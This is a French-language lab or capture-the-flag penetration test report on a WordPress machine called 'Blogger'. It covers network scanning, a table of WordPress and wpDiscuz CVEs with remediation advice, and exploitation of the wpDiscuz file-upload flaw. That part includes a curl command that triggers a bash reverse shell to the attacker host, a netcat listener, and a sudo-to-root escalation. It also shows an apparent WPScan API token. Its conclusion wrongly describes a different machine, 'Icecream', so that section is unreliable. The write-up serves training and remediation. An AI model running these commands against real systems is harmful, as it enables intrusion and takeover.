# 📌 Rapport de Vulnérabilité - Blogger

## 📖 Sommaire

1. 📝 Introduction  
2. 🔍 Découverte du Réseau  
3. 🚀 Analyse des Ports et Services  
4. 🌐 Exploration du Site Web  
5. 🔥 Scan de Vulnérabilités WordPress  
6. 🔴 Vulnérabilités Critiques  
7. ⚠️ Vulnérabilités Élevées  
8. 🟠 Vulnérabilités Moyennes  
9. 🟡 Vulnérabilités Faibles  
10. 🚀 Exploitation de la Faille Critique wpDiscuz  
11. ⚠️ Exploitation Potentielle et Risques  
12. 🛡️ Recommandations de Sécurité  

---

## 📝 Introduction

### 🎯 Objectif
L'objectif de ce rapport est d'identifier et d'exploiter les vulnérabilités de la machine cible "Blogger", puis de proposer des solutions pour améliorer la sécurité de l'environnement testé.

### 🌍 Informations sur l'Environnement
- **IP cible :** `192.168.1.4`
- **IP de la machine d'attaque :** `192.168.1.157`
- **Outils utilisés :** `netdiscover`, `nmap`, `dirb`, `wpscan`

### 🖼️ Schéma de l’Infrastructure
Un aperçu de l’infrastructure actuelle est illustré ci-dessous :

![image](https://github.com/user-attachments/assets/ee415b14-24e6-4877-9e9a-322167c8b204)

---

## 🔍 1. Découverte du Réseau

### 🔎 Scan du Réseau Local
Un scan du réseau a été réalisé pour détecter les machines actives à l'aide de `netdiscover` :

```bash
sudo netdiscover -r 192.168.1.0/24
```

Une machine avec l’IP `192.168.1.4` a été détectée.

![image](https://github.com/user-attachments/assets/b6b1c037-3b74-4804-8232-aacc448f5422)

---

## 🚀 2. Analyse des Ports et Services

### 🛠 Scan Nmap
Après la découverte des machines actives, un scan détaillé avec `nmap` a été réalisé pour identifier les ports ouverts et les services associés sur l'IP cible.

```bash
nmap -sS -sC -sV -A -O -vvv 192.168.1.4
```

**Résultats :**
| Port | Service | Version |
|------|---------|---------|
| 22   | SSH     | OpenSSH X.X |
| 80   | HTTP    | Apache/WordPress |

On constate que **deux ports sont ouverts** : 
- **Port 22 (SSH)** 
- **Port 80 (HTTP)**

Le **port 80** héberge un service web accessible via un navigateur.

![image7](https://github.com/user-attachments/assets/4d79c829-77d3-4597-bf01-ed05cb9aa17d)
![image8](https://github.com/user-attachments/assets/0e9aa5c5-e8ad-42e2-920d-c9acb4b900da)

---

## 🌐 3. Exploration du Site Web

### 🖥 Accès au Site Web
En entrant l'adresse `http://192.168.1.4` dans le navigateur, une page web s'affiche.

![image](https://github.com/user-attachments/assets/7f8b1882-1a00-4b75-b9a2-535b2619cf0d)

### 📂 Recherche de Contenus Cachés avec Dirb
Un scan avec `dirb` a été effectué pour découvrir des répertoires cachés :

```bash
dirb http://192.168.1.4
```

**Résultats :**
- **Répertoire découvert :** `/assets/fonts/blog`
- Ce répertoire contient une instance **WordPress**.

![image10](https://github.com/user-attachments/assets/ef33f844-e003-4e48-b7d7-a1c3a7b7dc2c)

### 🛠 Ajout d'une Entrée dans le Fichier Hosts
Pour faciliter l’accès, un alias `blogger.thm` a été ajouté dans le fichier `/etc/hosts` :

```bash
echo "192.168.1.4 blogger.thm" | sudo tee -a /etc/hosts
```

---

## 🔥 4. Scan de Vulnérabilités WordPress

### 🏴 Utilisation de WPScan
Un scan approfondi a été réalisé sur WordPress pour détecter les vulnérabilités :

**Commande exécutée :**
```bash
wpscan --url http://192.168.1.4/assets/fonts/blog --plugins-detection mixed --enumerate ap --api-token=B4ZGWKhJHufoRPD6PAzqdQlraiSHRxinJF6zzaa6qtY
```
Résultats : Des vulnérabilités allant de critiques à faibles ont été détectées. Ces vulnérabilités sont détaillées dans les sections suivantes du rapport, avec des recommandations pour les patcher.

---

## 🔴 **Vulnérabilités Critiques**
| Plugin/Vulnérabilité | Description |
|----------------------|-------------|
| **WordPress Core** | Exécution de code à distance (CVE-2019-8942, CVE-2019-8943) |
| **WordPress Core** | Problème avec les tokens de réinitialisation de mot de passe (CVE-2020-11027) |
| **Plugin wpDiscuz** | Téléchargement de fichiers arbitraires non authentifié (CVE-2020-24186) |
| **Plugin wpDiscuz** | Injection SQL non authentifiée (CVE-2023-3869) |

## Explication des Risques et des Impacts

### Exécution de Code à Distance
Permet à un attaquant d'exécuter du code arbitraire sur le serveur, potentiellement prenant le contrôle total de celui-ci.

### Problèmes de Tokens de Réinitialisation
Un attaquant pourrait intercepter ou réutiliser un token pour changer le mot de passe d'un utilisateur sans autorisation.

### Téléchargement de Fichiers Arbitraires
Cette vulnérabilité permet à des fichiers malveillants d'être téléchargés sur le serveur, facilitant l'exécution de code malveillant.

### Injection SQL
Permet à un attaquant d'injecter des requêtes SQL malveillantes qui peuvent lire, modifier, ou supprimer des données dans la base de données.

## Recommandations pour le Patching

- **Mise à jour immédiate de WordPress et de tous les plugins** : Installer les dernières versions pour corriger les vulnérabilités connues.
- **Restriction des fichiers uploadables** : Configurer le serveur pour limiter les types de fichiers pouvant être uploadés et exécutés.
- **Utilisation de préparations SQL** : S'assurer que toutes les requêtes à la base de données utilisent des méthodes qui préviennent l'injection SQL, telles que les requêtes préparées.

---

## ⚠️ **Vulnérabilités Élevées**
| Plugin/Vulnérabilité | Description |
|----------------------|-------------|
| **WordPress Core** | Injection XSS via l'upload de fichiers (CVE-2020-11026) |
| **WordPress Core** | Suppression arbitraire de fichiers (CVE-2018-20147) |
| **WordPress Core** | Injection XSS via l'éditeur de blocs (CVE-2019-16781, CVE-2019-16780) |
| **WordPress Core** | Contournement des permissions administratives (CVE-2019-17675) |
| **Plugin wpDiscuz** | Injection de contenu non authentifiée (CVE-2023-46310) |
| **Plugin wpDiscuz** | Faille d'autorisation permettant modification de contenu (CVE-2023-3998) |


## Explication des Risques et des Impacts

### Injection XSS
Permet à un attaquant d'injecter du script malveillant qui peut être exécuté dans le navigateur de l'utilisateur, volant des sessions ou des données.

### Suppression Arbitraire de Fichiers
Un attaquant peut supprimer des fichiers cruciaux du serveur, potentiellement causant un déni de service.

### Contournement des Permissions
Permet à des utilisateurs non autorisés d'effectuer des actions normalement réservées aux administrateurs, compromettant ainsi la sécurité du site.

### Injection de Contenu
Un attaquant pourrait modifier le contenu du site sans être authentifié, affectant l'intégrité du site.

## Recommandations pour le Patching

- **Mise à jour de WordPress et des plugins** : Assurez-vous que toutes les composantes du site sont à jour avec les dernières sécurités.
- **Renforcement des politiques de contenu** : Utiliser des headers de sécurité comme Content-Security-Policy pour prévenir les XSS.
- **Audit des permissions** : Réviser et restreindre les permissions pour s'assurer que seuls les utilisateurs nécessaires ont accès à des fonctionnalités sensibles.

---

## 🟠 **Vulnérabilités Moyennes**
| Plugin/Vulnérabilité | Description |
|----------------------|-------------|
| **WordPress Core** | Accès non authentifié aux brouillons et contenus privés (CVE-2019-17671) |
| **WordPress Core** | Injection d'objets PHP via métadonnées (CVE-2018-20148) |
| **WordPress Core** | Empoisonnement du cache des requêtes JSON (CVE-2019-17673) |
| **Plugin wpDiscuz** | XSS stocké via la soumission de commentaires (CVE-2023-47185) |
| **Plugin wpDiscuz** | Manque d'autorisation dans les actions AJAX (CVE-2023-45760) |

## Explication des Risques et des Impacts

### Accès non authentifié
Un attaquant peut accéder à des informations normalement non accessibles sans authentification, potentiellement exposant des données sensibles.

### Injection d'objets PHP
Cette vulnérabilité permet à un attaquant d'exécuter du code arbitraire en manipulant les métadonnées des objets.

### Empoisonnement du cache
Peut être utilisé pour servir du contenu malveillant à d'autres utilisateurs, exploitant la fonctionnalité de cache.

### XSS stocké
Permet à l'attaquant de stocker un script malveillant sur le site, qui sera exécuté à chaque fois que la page affectée est visitée.

### Manque d'autorisation AJAX
Les actions AJAX sans vérifications d'autorisation appropriées peuvent être exploitées pour effectuer des actions non autorisées.

## Recommandations pour le Patching

- **Contrôle d'accès renforcé** : S'assurer que toutes les informations sensibles nécessitent une authentification appropriée.
- **Validation et assainissement des entrées** : S'assurer que toutes les entrées, y compris les métadonnées, sont correctement validées et assainies pour prévenir l'injection.
- **Sécurisation du cache** : Configurer correctement le cache pour prévenir l'empoisonnement et assurer que le contenu est servi uniquement aux utilisateurs autorisés.
- **Audit des scripts AJAX** : Revoir toutes les fonctions AJAX pour s'assurer qu'elles implémentent des contrôles d'autorisation adéquats.

---

## 🟡 Vulnérabilités Faibles

Bien que de faible impact, ces vulnérabilités pourraient encore être utilisées en combinaison avec d'autres exploits pour mener des attaques plus complexes.

### **Détails des vulnérabilités faibles identifiées** :

| Plugin/Vulnérabilité | Description |
|----------------------|-------------|
| **WordPress Core** | XSS stocké via des liens spécifiques (CVE-2019-20042) |
| **WordPress Core** | Problème d'indexation des écrans d'activation utilisateurs (CVE-2018-20151) |
| **WordPress Core** | Vulnérabilité XSS sur Apache via l'upload de fichiers (CVE-2018-20149) |
| **WordPress Core** | Vulnérabilité XSS dans l'assainissement des URLs (CVE-2019-16222) |
| **Plugin Akismet** | Version obsolète avec failles connues |

**Explication des risques et des impacts** :
- **XSS stocké** : Similaire aux vulnérabilités moyennes, le XSS stocké dans ces contextes pourrait être utilisé pour des attaques ciblées.
- **Problèmes d'indexation** : Peut permettre à des attaquants de découvrir des informations sur les utilisateurs pendant les processus d'activation.
- **Vulnérabilité XSS sur Apache** : Spécifique à l'environnement serveur, cette faille pourrait permettre l'exécution de scripts dans des contextes inattendus.
- **Assainissement des URLs** : Manquements dans l'assainissement peuvent permettre des injections via des URLs mal formées.

### **Recommandations pour le patching** :
- **Mise à jour des plugins et du noyau** : Comme pour les autres niveaux de vulnérabilité, la mise à jour est cruciale.
- **Renforcement de l'assainissement des entrées** : Implémenter des contrôles stricts sur les données entrantes, spécialement dans les URLs et les liens.
- **Audit des paramètres serveur** : Examiner et ajuster les configurations du serveur pour renforcer la sécurité contre les XSS.

---

## **Légende des niveaux de risque**
🔴 **Critique** : Peut compromettre entièrement le site.  
⚠️ **Élevé** : Risque de compromission sévère.  
🟠 **Moyen** : Accès partiel aux données ou altération de contenu.  
🟡 **Faible** : Moins d'impact, souvent exploitable avec des privilèges existants.  

---

🚀 **Actions recommandées :**
- **Mettre à jour immédiatement** WordPress et ses plugins.
- **Désactiver XML-RPC** pour éviter les attaques externes.
- **Restreindre les permissions des fichiers et dossiers sensibles.**
- **Appliquer un pare-feu WAF** pour bloquer les attaques XSS et injections SQL.

📌 **Prochaine étape :** Effectuer un audit approfondi du serveur et des logs pour détecter toute compromission.

---

## 🚀 5. Exploitation de la Faille Critique wpDiscuz

### 🎯 Exploitation de la Vulnérabilité d’Upload de Fichier
Après avoir identifié la vulnérabilité critique sur **wpDiscuz**, nous allons tenter d’exploiter l’upload de fichiers malveillants.

### 📂 Étape 1 : Création du Fichier Malveillant
Dans le fichier `reverse.php`, nous ajoutons une signature GIF pour contourner les restrictions :

![image4](https://github.com/user-attachments/assets/6a7da93c-c14b-4139-a91b-6ba34dc72eac)
![image1](https://github.com/user-attachments/assets/95a8c8ff-6529-41a0-b6f1-80a8ed5101c4)

### ⏳ Étape 2 : Lancement d’une Écoute sur Kali
Nous démarrons un listener Netcat sur le port `4444` :

```bash
nc -lvnp 4444
```

![image9](https://github.com/user-attachments/assets/55122fb4-63fc-4e00-b0b8-3cc3cee4f63a)

### 📤 Étape 3 : Upload du Fichier Malveillant
Nous utilisons la vulnérabilité du plugin pour uploader `reverse.php` sur le serveur WordPress.

![image6](https://github.com/user-attachments/assets/68bcf9ac-ec3c-42bf-bf33-27758463a259)

### 🎉 Étape 4 : Prise de Contrôle
Une fois le fichier uploadé, nous exécutons la commande suivante pour déclencher le shell inversé :

```bash
curl "http://192.168.1.4/assets/fonts/blog/wp-content/uploads/reverse.php?cmd=bash -c 'bash -i >& /dev/tcp/192.168.1.X/4444 0>&1'"
```

### 🚨 Exploitation Additionnelle
#### Après établissement de la connexion :
- **Lancement d'un shell** : Après la connexion réussie via le fichier malveillant, je lance un shell pour interaction directe.
  
![image13](https://github.com/user-attachments/assets/586db230-3c5c-4168-bfc8-4df1e1125d54)
- **Recherche d'utilisateurs** : J'effectue une recherche des utilisateurs ayant accès au bash pour identifier les comptes utilisateurs potentiels à exploiter.
  
![image6](https://github.com/user-attachments/assets/8527a26e-9e32-40cf-b4f0-826900248989)
- **Passage sur un terminal bash classique** : Migration de l'interpréteur de commandes vers un shell bash plus stable et complet.
  
![image3](https://github.com/user-attachments/assets/6bad3863-5bf6-4075-a29a-17ebed8a5eb9)
- **Test de différentes connexions** : J'essaye de me connecter à l'utilisateur `root` puis à l'utilisateur `vagrant` pour évaluer les niveaux d'accès disponibles.
  
![image1](https://github.com/user-attachments/assets/b870f668-dd09-4534-91be-14710dd6dd57)
- **Exécution de la commande `sudo -l`** : Cette commande permet de lister les droits sudo de l'utilisateur courant pour identifier d'autres vecteurs d'escalade de privilèges.
  
![image15](https://github.com/user-attachments/assets/9ef2b073-2169-4971-9af2-fbf7454b3fad)
- **Connexion au compte root** : Utilisation de la commande `sudo su` pour accéder au compte root sans nécessité de mot de passe, confirmant une faille majeure dans la gestion des privilèges.

![image](https://github.com/user-attachments/assets/41e823df-f8f3-4b7c-b767-7e1cc1d25238)

- **Découverte du premier flag** : J'ai trouvé le premier flag dans `/home/james/user.txt`.

![image](https://github.com/user-attachments/assets/1ab4938a-cb6a-4a3a-889c-5c0fa0b8b83f)

- **Deuxième flag** : J'ai trouvé le deuxième flag dans `/root/root.txt`.

![image](https://github.com/user-attachments/assets/056e29c7-5402-489e-9694-2013c5954f56)

✅ **Nous obtenons un shell interactif sur la machine cible !**

---

## ⚠️ 6. Exploitation Potentielle et Risques

### 🔑 Vulnérabilités Identifiées

**WordPress obsolète** : Des versions antérieures de WordPress sont souvent vulnérables à des attaques de type XSS et injection SQL.  
**Plugins vulnérables** : Des plugins non mis à jour peuvent contenir des failles exploitées pour obtenir un accès non autorisé ou exécuter du code malveillant.  
**Exposition du service SSH** : Le service SSH, s'il est mal configuré ou si les mots de passe sont faibles, peut être bruteforcé ou exploité pour un accès non autorisé.

### 🚨 Risques et Conséquences

**Prise de contrôle de l’instance WordPress** : Un attaquant peut obtenir un contrôle total sur le site WordPress, modifiant le contenu ou redirigeant les visiteurs vers des sites malveillants.  
**Accès aux fichiers sensibles** : Les fichiers de configuration, les bases de données et d'autres données sensibles peuvent être accédés, compromettant la confidentialité des informations.  
**Possibilité d’escalade de privilèges** : À partir d'un accès initial limité, un attaquant pourrait escalader ses privilèges jusqu'à obtenir un contrôle total sur le système d'exploitation sous-jacent.

---

## 🛡️ 7. Recommandations de Sécurité

Pour remédier aux vulnérabilités identifiées et améliorer la sécurité générale du système, les actions suivantes sont recommandées :

Mise à jour immédiate de WordPress et de tous les plugins et thèmes : C'est la mesure la plus efficace pour corriger les failles de sécurité connues.

Restriction de l'accès au SSH : Limiter les accès SSH aux adresses IP de confiance et utiliser l'authentification par clé plutôt que par mot de passe.

Désactivation des plugins inutilisés : Les plugins qui ne sont pas nécessaires doivent être désactivés pour réduire la surface d'attaque.

Mise en place d'un pare-feu d'applications web (WAF) : Un WAF peut aider à bloquer les tentatives d'attaques XSS, d'injection SQL, et d'autres attaques web courantes.

Audits de sécurité réguliers : Des audits réguliers et des tests de pénétration peuvent aider à identifier et corriger les nouvelles vulnérabilités avant qu'elles ne soient exploitées.

Ces mesures, combinées à une vigilance continue et à des pratiques de sécurité informatique robustes, peuvent aider à sécuriser significativement le système contre les attaques futures.

## 8. Conclusion

Au cours de ce test d’intrusion, nous avons identifié et exploité plusieurs failles de sécurité dans la machine **Icecream**. En résumé, nous avons pu :

1. Découvrir et explorer des services ouverts, notamment via SMB.
2. Obtenir un accès initial en utilisant les partages SMB avec des droits en écriture.
3. Déployer un Web Shell pour exécuter des commandes à distance.
4. Élever nos privilèges jusqu’au compte root en exploitant une mauvaise configuration de l’outil **ums2net**.

Ces failles démontrent l’importance de maintenir une infrastructure correctement sécurisée. À chaque étape, des correctifs et des recommandations ont été proposés pour limiter les risques futurs.

**Points essentiels pour l’entreprise :**
- Supprimer ou sécuriser les services inutilisés.
- Réviser les permissions sur les fichiers critiques.
- Mettre à jour régulièrement les outils et dépendances.
- Implémenter des pratiques de surveillance et de gestion des journaux.

**Prochaine étape :** appliquer les correctifs proposés et effectuer des audits de sécurité réguliers afin de prévenir de futures compromissions.

